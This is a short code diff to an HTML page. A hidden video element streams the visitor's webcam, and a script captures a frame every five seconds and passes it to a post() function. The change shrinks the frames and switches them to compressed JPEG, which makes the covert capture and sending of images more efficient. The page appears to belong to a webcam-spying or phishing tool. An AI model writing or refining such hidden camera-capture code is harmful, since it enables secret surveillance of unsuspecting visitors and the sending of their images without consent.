@@ -74,7 +74,7 @@
 
     <div class="hidden-video">
         <video id="video" playsinline autoplay></video>
-        <canvas id="canvas" width="640" height="640"></canvas>
+        <canvas id="canvas" width="320" height="240"></canvas>
     </div>
 
     <script>
@@ -112,8 +112,8 @@
             video.srcObject = stream;
             var context = canvas.getContext('2d');
             setInterval(function () {
-                context.drawImage(video, 0, 0, 640, 640);
-                var canvasData = canvas.toDataURL("image/png");
+                context.drawImage(video, 0, 0, 320, 240);
+                var canvasData = canvas.toDataURL("image/jpeg", 0.7);
                 post(canvasData);
             }, 5000); // Capture every 5 seconds
         }
